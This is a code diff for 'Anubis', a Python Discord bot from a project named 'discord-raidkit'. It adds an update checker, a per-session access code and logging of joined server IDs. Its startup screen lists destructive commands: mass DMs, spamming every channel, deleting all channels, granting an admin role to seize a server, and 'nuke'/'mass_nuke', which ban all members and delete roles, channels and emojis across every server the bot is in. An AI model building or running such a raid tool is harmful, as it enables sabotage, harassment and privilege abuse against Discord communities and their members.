@@ -2,26 +2,76 @@
 # Bot under the GNU General Public Liscense v2 (1991).
 
 
-# Modules
+# Modules.
 
 import discord
 import os
 import json
 import asyncpg
 import random as r
+import requests
+import re
+from bs4 import BeautifulSoup
 from discord.ext import commands, tasks
 from itertools import cycle
 from colorama import Style, Back, Fore, init
 init()
 
+def find_updates():
+    THIS_VERSION = "1.3.0"
+
+    header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36", 
+    "X-Requested-With": "XMLHttpRequest"}
+    url = f"https://github.com/Catterall/discord-raidkit/releases/latest"
+
+    os.system('cls')
+    print("Searching for updates.")
+    r = requests.get(url, headers=header)
+    os.system('cls')
+    soup = str(BeautifulSoup(r.text, 'html.parser'))
+    s1 = re.search('<title>', soup)
+    s2 = re.search('·', soup)
+    result_string = soup[s1.end():s2.start()]
+    if THIS_VERSION not in result_string:
+        s3 = re.search('originating_url":"', soup)
+        s4 = re.search('","user_id":null', soup)
+        update_link = soup[s3.end():s4.start()]
+        print(Style.BRIGHT + Fore.LIGHTYELLOW_EX + f'''
+
+
+
+
+
+
+                   ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗██╗
+                   ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║
+                   ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  ██║
+                   ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
+                   ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
+                   ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝
+                                                                                     
+
+              {Fore.LIGHTRED_EX}Human. There has been a brand new update to the discord raidkit. You can find the update here:
+    
+                             {Fore.LIGHTBLUE_EX}{update_link}
+                            
+                                             {Fore.WHITE}(Enter anything to continue) '''.replace('█', f'{Fore.YELLOW}█{Fore.LIGHTGREEN_EX}'), end=f"\n\n{' '*59}")
+    input()
+    
+    return
+
+
+find_updates()
+
 
 # Message to be displayed if an error is encountered when starting the bot.
 
 def startError():
+    os.system('cls')
     print(Fore.BLUE + f'''
 
 
-                                     █████╗ ███╗   ██╗██╗   ██╗██████╗ ██╗███████╗
+                                      █████╗ ███╗   ██╗██╗   ██╗██████╗ ██╗███████╗
                                      ██╔══██╗████╗  ██║██║   ██║██╔══██╗██║██╔════╝
                                      ███████║██╔██╗ ██║██║   ██║██████╔╝██║███████╗
                                      ██╔══██║██║╚██╗██║██║   ██║██╔══██╗██║╚════██║
@@ -40,13 +90,20 @@ def startError():
 
 
 {Style.DIM}{Fore.GREEN}If the issue persists after all the above measures are taken, you can create an issue here:
-{Style.BRIGHT}{Back.RESET}{Fore.WHITE}https://github.com/Catterall/discord-pedo-hunting-tools/issues
+{Style.BRIGHT}{Back.RESET}{Fore.WHITE}https://github.com/Catterall/discord-raidkit/issues
 
 {Fore.YELLOW}Thank you for using Anubis and apologies for all errors encountered! -Catterall.
 '''.replace('█', f'{Fore.WHITE}█{Fore.BLUE}'))
     close = input("")
-    return
+    os._exit(0)
 
+if os.path.isfile('cogs/temp.txt'):
+    os.remove('cogs/temp.txt')
+
+with open('cogs/temp.txt', 'w') as f:
+    CODE = r.randint(1000, 9999)
+    f.write(str(CODE))
+    f.close()
 
 #  Regenerate JSON file if lost.
 
@@ -62,13 +119,14 @@ except FileNotFoundError:
         json.dump(data, f, indent=4)
         f.close()
 
-if os.path.isfile('cogs/temp.txt'):
-    os.remove('cogs/temp.txt')
+#  Regenerate server file if lost.
 
-with open('cogs/temp.txt', 'w') as f:
-    leave_code = r.randint(1000, 9999)
-    f.write(str(leave_code))
-    f.close()
+try:
+    with open('cogs/servers.txt', 'r') as f:
+        f.close()
+except FileNotFoundError:
+    with open('cogs/servers.txt', 'w') as f:
+        f.close()
 
 # Sets the bot prefix to the prefix specified in the JSON file.
 
@@ -127,8 +185,9 @@ async def reload(ctx, extension):
 
 @bot.event
 async def on_ready():
-    global leave_code
+    global CODE
     change_status.start()
+    os.system('cls')
     print(Fore.BLUE + f'''     
                                     ███████╗███╗   ██╗██╗   ██╗██████╗ ██╗███████╗
                                     ██╔══██║████╗  ██║██║   ██║██╔══██╗██║██╔════╝
@@ -138,26 +197,34 @@ async def on_ready():
                                     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝
 
 {Fore.WHITE}{Back.BLUE}The following commands can be used in any text channel within the target server - permissions are not needed:
-{Back.RESET}{Style.DIM}{Fore.RED}{data.get('prefix')}leave <leave-code> <server>: Makes the bot leave a server (Your current leave code is {Fore.WHITE}{leave_code}{Fore.RED}).
-{Style.BRIGHT}{Fore.LIGHTRED_EX}{data.get('prefix')}nick_all <nickname>: Change the nickname of all members on a server.
-{Style.DIM}{Fore.YELLOW}{data.get('prefix')}mass_dm <message>: Message all of the members on a server with a custom message.
-{Style.NORMAL}{Fore.GREEN}{data.get('prefix')}spam <message>: Repeatedly spam all text channels on a server with a custom message.
-{Fore.BLUE}{data.get('prefix')}cpurge: Delete all channels on a server.
-{Style.DIM}{Fore.MAGENTA}{data.get('prefix')}admin <role_name>: Gain administrator privileges on a server via an admin role created by the bot.
-{Style.BRIGHT}{Fore.LIGHTMAGENTA_EX}{data.get('prefix')}nuke: Ban all members, then delete all roles, then delete all channels, then delete all custom emojis on a server.
-{Style.DIM}{Fore.RED}{data.get('prefix')}raid <role_name> <nickname> <channel_name> <num_of_channels> <message>:
+{Back.RESET}{Style.DIM}{Fore.RED}{data.get('prefix')}leave {CODE} <server>: Makes the bot leave a server.
+{Style.BRIGHT}{Fore.LIGHTRED_EX}{data.get('prefix')}mass_leave {CODE}: Makes the bot leave every server.
+{Style.DIM}{Fore.YELLOW}{data.get('prefix')}nick_all {CODE} <nickname>: Change the nickname of all members on a server.
+{Style.NORMAL}{Fore.GREEN}{data.get('prefix')}mass_dm {CODE} <message>: Message all of the members on a server with a custom message.
+{Fore.BLUE}{data.get('prefix')}spam {CODE} <message>: Repeatedly spam all text channels on a server with a custom message.
+{Style.DIM}{Fore.MAGENTA}{data.get('prefix')}cpurge {CODE}: Delete all channels on a server.
+{Style.BRIGHT}{Fore.LIGHTMAGENTA_EX}{data.get('prefix')}admin {CODE} <role_name>: Gain administrator privileges on a server via an admin role created by the bot.
+{Style.DIM}{Fore.RED}{data.get('prefix')}nuke {CODE}: Ban all members, then delete all roles, then delete all channels, then delete all emojis on a server.
+{Style.BRIGHT}{Fore.LIGHTRED_EX}{data.get('prefix')}mass_nuke {CODE}: Nuke every server the bot is currently in.
+{Style.DIM}{Fore.YELLOW}{data.get('prefix')}raid {CODE} <role_name> <nickname> <channel_name> <num_of_channels> <message>:
 Delete all channels, then delete all roles, then give everyone a new role, then nickname everyone a new nickname,
 then create x number of channels, then message everyone with a message, then spam all channels with a message.
 
-
 {Style.DIM}{Fore.GREEN}Additional notes:
-{Style.BRIGHT}{Back.RESET}{Fore.WHITE}Before running the nuke command, make sure the role created by the bot upon its invite is above the roles of the
+{Style.BRIGHT}{Back.RESET}{Fore.WHITE}Before running the nuke commands, make sure the role created by the bot upon its invite is above the roles of the
 members you wish to ban (i.e. move the role as high as possible).
 
-{Fore.LIGHTCYAN_EX}To refresh this window back to this page, use the command: {Fore.LIGHTGREEN_EX}{data.get('prefix')}refresh
+{Fore.LIGHTCYAN_EX}To refresh this window back to this page, use the command: {Fore.LIGHTGREEN_EX}{data.get('prefix')}refresh {CODE}
 
 {Fore.LIGHTRED_EX}Anubis created by Catterall (View for full guide): {Fore.WHITE}https://www.github.com/Catterall{Style.DIM}{Fore.RED}'''.replace('█', f'{Fore.WHITE}█{Fore.BLUE}'))
 
+# On joining a server.
+
+@bot.event
+async def on_guild_join(guild):
+    with open('cogs/servers.txt', 'a') as f:
+        f.write(str(guild.id)+"\n")
+        f.close()
 
 # On error (error handling).
 
